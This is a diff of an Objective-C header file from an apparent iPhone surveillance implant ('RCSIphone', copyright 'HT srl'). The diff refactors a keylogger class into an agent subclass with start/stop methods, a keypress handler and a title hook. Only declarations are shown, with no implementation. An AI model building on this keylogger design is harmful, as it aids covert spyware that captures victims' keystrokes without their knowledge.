@@ -2,34 +2,27 @@
 //  RCSIAgentInputLogger.h
 //  RCSIphone
 //
-//  Created by revenge on 3/8/10.
-//  Copyright 2010 __MyCompanyName__. All rights reserved.
+//  Created on 3/8/10.
+//  Copyright 2010 HT srl. All rights reserved.
 //
 
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
 
+#import "RCSIAgent.h"
+
 #define KEY_MAX_BUFFER_SIZE   0x10
 
-
-@interface RCSIKeyLogger : NSObject
+@interface agentKeylog : RCSIAgent
 {
   NSMutableString *mBufferString;
   BOOL mContextHasBeenSwitched;
 }
 
-@property (readwrite) BOOL mContextHasBeenSwitched;
-
-- (id)init;
-- (void)dealloc;
-
+- (void)setTitleHook: (id)arg1;
 - (void)keyPressed: (NSNotification *)aNotification;
 
-@end
-
-@interface myUINavigationItem : NSObject
-
-- (id)title;
-- (void)setTitleHook: (id)arg1;
+- (BOOL)start;
+- (void)stop;
 
 @end
